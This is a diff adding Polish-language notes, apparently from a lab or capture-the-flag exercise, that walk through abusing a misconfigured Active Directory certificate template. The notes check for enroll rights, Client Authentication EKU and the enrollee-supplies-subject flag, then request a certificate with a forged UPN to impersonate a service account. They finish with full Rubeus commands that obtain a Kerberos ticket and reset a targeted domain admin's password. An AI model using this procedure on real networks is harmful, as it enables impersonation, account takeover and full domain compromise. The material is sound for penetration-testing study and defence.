@@ -1,0 +1,39 @@
+1) Wyszukanie (3 - wartosci w certyfikacie)
+      • Wyswietlenie certyfikatow
+            ▪ certutil -v -template
+      • Wyswietlenie do jakich grup nalezy uzytkownik
+            ▪ net user <user> /domain 
+      • 1 - wartosc (uprawnienia do zarzadania certyfikatu)
+            ▪ Certyfikat musi miec wartosc ALLOW ENROOL lub ALLOW FULL
+            ▪ Wartosc musi byc przy urzytkowniku lub grupie do ktorej nalezy
+      • 2 - wartosc (Posiada EKU uwierzytelniania clienta)
+            ▪ Sprawdzamy czy sekcja EKU certyfikatu zawiera slowa
+            ▪ Client Authentication
+      • 3 - wartosc (Czy idzie zmienic nazwe podmiotu SAN)(zwykle adres URL)
+            ▪ Flaga “CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT” musi byc ustawiona na 1
+
+2) Wygenerowanie i eksport certyfikatu
+      • Generujemy legalnie w okienku
+            ▪ ctrl+r -> mmc
+            ▪ File -> Add/Remove Snap-in
+            ▪ Certificates -> Add
+            ▪ Personal -> PPM -> All Tasks -> Request New Cert
+            ▪ [Zloty trojkat z wykrzyknikiem] More information...
+            ▪ Type:(common name) -> Wpisujemy nazwe certyfikatu
+            ▪ Type:(User principal name) -> UPN konta pod ktore sie podszywamy (np. gitlab@lunar.eruca.com)
+            ▪ [Add>] [Add>] [OK]
+            ▪ Zaznaczamy “User Request” -> Enrool
+            ▪ Personal -> Certificates -> <name> -> PPM -> all Tasks -> Export
+            ▪ Zaznaczamy “Yes, export the private key”
+            ▪ Podajemy jakies haslo
+
+3) Generujemy TGT za pomoca certyfikatu
+      • Rubeus
+            ▪ Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:lunar.eruca.com /dc:<IP of domain controller>
+
+4) Uzycie klucza do zmiany chasla konta
+      • Rubeus
+            ▪ Rubeus.exe changepw /ticket:<path to ticket file> /new:<new password for user> /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\<username of targeted DA>
+     
+                
+                
